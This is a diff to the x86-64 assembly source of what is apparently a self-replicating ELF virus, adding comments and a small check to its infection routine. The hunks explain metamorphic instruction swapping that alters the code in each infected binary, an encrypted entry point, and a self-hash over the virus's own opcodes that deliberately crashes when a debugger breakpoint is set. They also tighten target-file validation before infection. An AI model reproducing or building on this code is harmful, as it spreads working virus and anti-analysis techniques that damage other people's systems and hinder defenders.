@@ -11,6 +11,9 @@ _war:
     lea rsi, [rel obfu]
     W_JUNK
     W_JUNK
+; Here i check if starting point is encrypted i need to check this
+; for first execution, however i should retire this from infected
+; binaries since there will always be encrypted.
     cmp byte [rsi], 0x50
     jne decrypt
     W_JUNK
@@ -34,7 +37,7 @@ random_number:
 
 ;-------------------------------------------------------------
 ; parameters = $al
-; return number > 0 && < al
+; return number >= 0 && < al
 ;-------------------------------------------------------------
 spec_number:
     cmp al, 0x0
@@ -54,6 +57,10 @@ spec_number:
         ret
 
 
+; This is metamorphic code.
+; For example : mov rax, 0 is equal to xor rax, rax
+; Here i have multiple sets of instructions that does the same things,
+; they replace themselve by another in every infected binaries
 ; [0] = n set
 ; [1] = n permutable instruction
 ; 0xFD = delimiter
@@ -66,7 +73,7 @@ db 0x04, 0x03, 0xFD, 0x48, 0x83, 0xc0, 0x01, 0x90, 0x90, 0x90, 0x90, 0xFD, 0x48,
 
 ;-------------------------------------------------------------
 ; RDI = addr to search / replace for
-; this replace each starting point of XORCipher with equvalent
+; this replace each starting point of XORCipher with equivalent
 ; instructions
 ;-------------------------------------------------------------
 repl:
@@ -140,12 +147,14 @@ key_to_string:
     mov byte [rsp + 8 + rcx], 0x0
     ret
 
-; The key can be to length 16 and it should be the sum of every instructions
 ; https://eli.thegreenplace.net/2011/01/27/how-debuggers-work-part-2-breakpoints <-- god tiers
 ;-------------------------------------------------------------
+; This function create an HASH based on the OPCODE from the virus himself
+; For example if we place breakpoint the HASH will be different which 
+; cause segfault on purpose.
 ; PARAMS => rdi = addr, rdx = size
-; Generate a hash with FROM addr to addr + size 
-; Hash in RAX
+; return HASH in RAX
+; It use https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function
 ;-------------------------------------------------------------
 fnv:
     sub rsp, 16
@@ -748,6 +757,8 @@ validate_target:
     syscall
     cmp rax, 0
     jne next_file
+    cmp QWORD [rsp + FILE_SIZE + DIRENT + 48], 64
+    jle next_file
 
 map_target:
     mov rdi, 0x0
